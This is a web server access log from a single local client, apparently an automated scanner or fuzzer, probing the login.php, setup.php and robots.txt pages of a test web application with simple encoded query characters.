172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php?query=%00 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php?query=%7C HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /robots.txt HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /robots.txt?= HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /robots.txt?query= HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /robots.txt?query=%40 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /robots.txt?query=%2B HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /robots.txt?query=%00 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /robots.txt?query=%7C HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php?= HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php HTTP/1.1" 200 4347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php?query= HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /setup.php?= HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php?query=%40 HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php HTTP/1.1" 200 4347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php?query=%2B HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /setup.php?query= HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php?query=%00 HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /setup.php?query=%40 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php?query=%7C HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /setup.php?query=%2B HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /setup.php?query=%00 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /setup.php?query=%7C HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php HTTP/1.1" 200 4447 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /setup.php HTTP/1.1" 200 4347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /sitemap.xml HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
